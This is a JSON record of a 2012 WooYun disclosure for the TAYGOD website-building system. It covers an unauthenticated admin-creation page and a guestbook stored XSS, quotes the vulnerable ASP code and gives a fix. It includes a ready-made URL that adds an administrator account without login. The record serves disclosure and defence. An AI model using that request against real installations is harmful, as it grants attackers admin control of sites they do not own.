{"id": 17909, "wybug_id": "wooyun-2012-09821", "wybug_title": "TAYGOD免费企业建站系统无验证添加管理员漏洞实战及留言本XSS漏洞", "wybug_corp": "TAYGOD", "wybug_author": "无敌金创药", "wybug_date": "2012-07-18 11:51", "wybug_open_date": "2012-09-01 11:51", "wybug_type": "非授权访问/权限绕过", "wybug_level": "高", "wybug_rank_0": "18", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "持久型", "敏感接口缺乏认证", "未授权访问", "越权操作", "敏感接口缺乏校验"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-07-18：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2012-09-01：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： ①无验证添加管理员②留言本XSS漏洞 详细说明：  ①无验证添加管理员漏洞文件：Admin_Add.asp漏洞代码：<!--#include file=\"../../config/conn.asp\"--><!--#include file=\"md5.asp\"--><%if request.QueryString(\"action\")=\"save\" thenuid=replace(trim(Request(\"uid\")),\"'\",\"\")realname=replace(trim(Request(\"realname\")),\"'\",\"\")pwd1=replace(trim(Request(\"pwd1\")),\"'\",\"\")pwd2=replace(trim(Request(\"pwd2\")),\"'\",\"\")password=md5(pwd1)原因：未进行验证直接写入数据利用方案：构造URLhttp://localhost/source/admin/Admin_Add.asp?action=save&uid=test&realname=test&pwd1=123456&pwd2=123456这样就能添加进去一个帐号为test，密码为123456的管理员用户②留言本XSS漏洞漏洞文件：Message.asp漏洞代码：if request.QueryString(\"action\")=\"save\" thenusername=trim(request(\"username\"))email=trim(request(\"email\"))tel=trim(request(\"tel\"))zhiwu=trim(request(\"zhiwu\"))city=trim(request(\"city\"))qq=trim(request(\"qq\"))add=trim(request(\"add\"))title=trim(request(\"title\"))content=trim(request(\"content\"))messageip=Request.ServerVariables(\"REMOTE_ADDR\") set rs=server.CreateObject(\"adodb.recordset\")rs.open \"select * from TAY_message\",conn,1,3原因：未过滤,后台照样能够执行   漏洞证明：  \n\n介个站点是官方演示站点，同样存在漏洞   修复方案：  修补方案：加入判断代码if session(\"admin\")=\"\" thenresponse.Write \"<script language='javascript'>alert('网络超时或您还没有登陆！');window.location.href='login.asp';</script>\"response.Endend if留言本添加过滤   版权声明：转载请注明来源 无敌金创药@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}